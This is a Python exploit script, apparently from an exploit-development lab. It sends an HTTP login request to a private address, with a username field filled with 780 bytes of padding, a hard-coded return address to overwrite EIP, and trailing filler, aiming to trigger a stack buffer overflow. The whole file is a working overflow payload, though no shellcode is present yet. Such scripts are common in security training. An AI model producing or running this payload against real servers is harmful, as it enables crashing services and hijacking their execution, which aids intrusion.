#!/usr/bin/env python3
import socket

try:
    print("\nAttempting to send buffer...")

    # build payload pieces as bytes
    filler = b"A" * 780
    eip = b"\x83\x0c\x09\x10"
    offset = b"C" * 4
    buffer_tail = b"D" * (1500 - len(filler) - len(eip) - len(offset))

    inputBuffer = filler + eip + offset + buffer_tail

    # form application/x-www-form-urlencoded body (bytes)
    content = b"username=" + inputBuffer + b"&password=A"

    # build HTTP request as bytes; content-length must be bytes too
    request = (
        b"POST /login HTTP/1.1\r\n"
        b"Host: 192.168.233.10\r\n"
        b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        b"Accept-Language: en-US,en;q=0.5\r\n"
        b"Referer: http://192.168.233.10/login\r\n"
        b"Connection: close\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: " + str(len(content)).encode("ascii") + b"\r\n"
        b"\r\n"
    ) + content

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(("192.168.233.10", 80))
        s.sendall(request)

    print("\nSuccess!")

except Exception as e:
    print("\nCould not connect")
    # optionally print(e) for debugging

